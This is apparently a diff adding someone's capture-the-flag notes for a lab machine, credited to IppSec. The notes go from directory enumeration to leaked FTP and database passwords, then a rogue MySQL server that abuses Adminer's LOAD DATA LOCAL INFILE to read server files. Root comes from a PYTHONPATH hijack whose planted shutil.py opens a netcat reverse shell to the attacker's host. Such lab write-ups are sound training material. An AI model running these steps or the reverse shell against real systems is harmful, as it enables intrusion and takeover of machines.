@@ -1,0 +1,64 @@
+//based on IppSec
+
+robots.txt
+/admin-dir 
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.187/admin-dir -o gobuster_admin-dir.txt -x txt
+ftpuser : %n?4Wz}R$tTF7
+ftp 10.10.10.187
+	>passive
+	>mget *
+
+index.php
+	$servername = "localhost";                                                                
+	$username = "waldo";                                                                      
+	$password = "]F7jLHw:*G>UPrTo}~A"d6b";                                                    
+	$dbname = "admirerdb";
+utility-scripts/db_admin.php
+	$servername = "localhost";
+	$username = "waldo";
+	$password = "Wh3r3_1s_w4ld0?";
+http://10.10.10.187/utility-scripts/adminer.php
+
+sudo service mysql start
+sudo mysql -u root
+	create user 'carlos'@'10.10.10.187' IDENTIFIED BY 'Careful';
+	GRANT ALL on DeleteMeWhenDone.* TO 'carlos'@'10.10.10.187';
+	FLUSH PRIVILEGES;
+
+socat TCP-LISTEN:3306,fork,bind=10.10.14.8 TCP:127.0.0.1:3306	//bind routable interface to localhost
+
+vim /etc/mysql/mariadb.conf.d/50-server.cnf
+	bind-address = 0.0.0.0
+sudo service mysql restart
+ss -lnpt | grep 3306		//check status of service on a port, similar to netstat
+
+//google adminer exploit:  https://www.vesiluoma.com/abusing-mysql-clients/
+LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE disobey.test FIELDS TERMINATED BY "\n"
+
+mysql> create database DeleteMeWhenDone;
+use DeleteMeWhenDone;
+create table Whatever ( OUTPUT TEXT(4096) );
+
+http://10.10.10.187/utility-scripts/adminer.php?server=10.10.14.25&username=carlos&db=DeleteMeWhenDone
+
+LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE Whatever FIELDS TERMINATED BY "\n"
+
+mysql>select * from whatever;
+waldo : &<h5b~yK3F#{PaPB&dA}{H>
+
+ssh waldo@10.10.10.187		//got user
+
+/opt/admin_tasks.sh
+/opt/backup.py
+
+sudo -l
+sudo /opt/scripts/admin_tasks.sh
+
+vim /dev/shm/shutil.py
+	import os
+	def make_archive(a,b,c):
+        	os.system("nc -c bash 10.10.14.25 9001")
+
+rlwrap nc -lvnp 9001
+
+sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh	//got root
